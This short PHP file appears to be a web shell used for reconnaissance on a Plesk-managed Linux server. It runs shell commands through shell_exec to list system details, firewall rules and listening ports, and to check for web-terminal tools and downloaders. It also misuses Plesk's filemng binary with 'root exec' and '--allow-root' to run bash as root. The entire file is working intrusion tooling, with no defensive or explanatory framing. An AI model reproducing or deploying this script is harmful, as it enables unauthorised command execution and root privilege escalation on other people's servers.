<?php
function sh($c){echo ">> $c\n"; echo trim((string)shell_exec($c))."\n\n";}
$fm='/opt/psa/admin/bin/filemng';
sh('uname -a');
sh('which ttyd gotty curl wget 2>/dev/null; command -v ttyd; command -v gotty');
sh('ufw status 2>&1 | head -20');
sh('iptables -L INPUT -n 2>&1 | head -30');
sh('firewall-cmd --state 2>&1; iptables -S INPUT 2>&1 | head -40');
sh('ss -ltnp | head -40');
sh('plesk bin firewall --help 2>&1 | head -20');
sh("$fm root exec / bash -c 'ufw status numbered 2>&1 | head -25; echo ---; iptables -L INPUT -n --line-numbers 2>&1 | head -35; echo ---; which curl wget; uname -m; cat /etc/os-release | head -5' --allow-root");
echo "DONE\n";
